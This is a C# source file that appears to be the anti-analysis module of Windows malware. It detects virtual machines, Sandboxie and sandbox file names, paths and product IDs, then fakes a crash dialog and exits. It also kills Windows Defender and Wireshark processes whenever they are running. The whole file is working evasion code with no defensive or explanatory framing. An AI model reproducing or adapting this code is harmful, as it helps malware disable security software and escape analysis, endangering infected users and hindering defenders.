using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace myApp
{
    internal class Antis
    {
        public static void Verif()
        {
            if (AVPC())
                iSdbg();
            else if (AA1())
                iSdbg();
            else if (AA12())
                iSdbg();
            else if (AS())
                iSdbg();
            else if (AVB())
                iSdbg();
            else if (ASB())
                iSdbg();
            else if (ATE())
                iSdbg();
            AntiWinDef1();
            AntiWinDef2();
            AntiWireShark();

        }

        private static void iSdbg()
        {
            MessageBox.Show(
                "Application Error: The instruction at \"0x7883b4\" referenced memory at \"0x004467\". The memory could not be \"read\".",
                "Critical Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            Environment.Exit(0);
        }

        private static bool AVB()
        {
            if (prcIsRunning("VBoxService"))
                return true;
            return false;
        }

        private static bool ASB()
        {
            if (Directory.Exists("C:\\analysis"))
                return true;
            return false;
        }

        private static void AntiWireShark()
        {
            if (prcIsRunning("wireshark"))
            {
                killProcess("wireshark");
            }
        }

        private static void AntiWinDef1()
        {
            if (prcIsRunning("MSASCui"))
            {
                killProcess("MSASCui");
            }
        }

        private static void AntiWinDef2()
        {
            if (prcIsRunning("msmpeng"))
            {
                killProcess("msmpeng");
            }
        }


        private static bool AS()
        {
            if (Process.GetProcessesByName("SbieSvc").Length >= 1 | Process.GetProcessesByName("sniff_hit").Length >= 1 |
                Process.GetProcessesByName("sysAnalyzer").Length >= 1)
                return true;
            return false;
        }


        private static bool AA1()
        {
            string folder = Application.StartupPath;
            string getFile = folder + "\\sample.exe";
            if (Application.ExecutablePath == getFile)
                return true;
            return false;
        }

        private static bool ATE()
        {
            if (Process.GetCurrentProcess().MainModule.FileName.Contains("sample"))
                return true;
            return false;
        }

        private static bool AA12()
        {
            RegistryKey regPID = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                                                                  false);
            object pid = regPID.GetValue("ProductId");
            string id = "76487-337-8429955-22614";

            if ((string)pid == id)
                return true;
            return false;
        }

        private static bool AVPC()
        {
            if (Process.GetProcessesByName("vpcmap").Length >= 4 & Process.GetProcessesByName("vmsrvc").Length >= 4)
            {
                return true;
            }
            if (Process.GetProcessesByName("vmusrvc").Length >= 4)
            {
                return true;
            }
            return false;
        }


        public static bool prcIsRunning(string process)
        {
            foreach (Process p in Process.GetProcesses())
                if (p.ProcessName.Contains(process))
                    return true;
            return false;
        }

        public static void killProcess(string process)
        {
            foreach (Process p in Process.GetProcesses())
                if (p.ProcessName.Contains(process))
                    try
                    {
                        p.Kill();
                    }
                    catch
                    {
                    }

        }
    }
}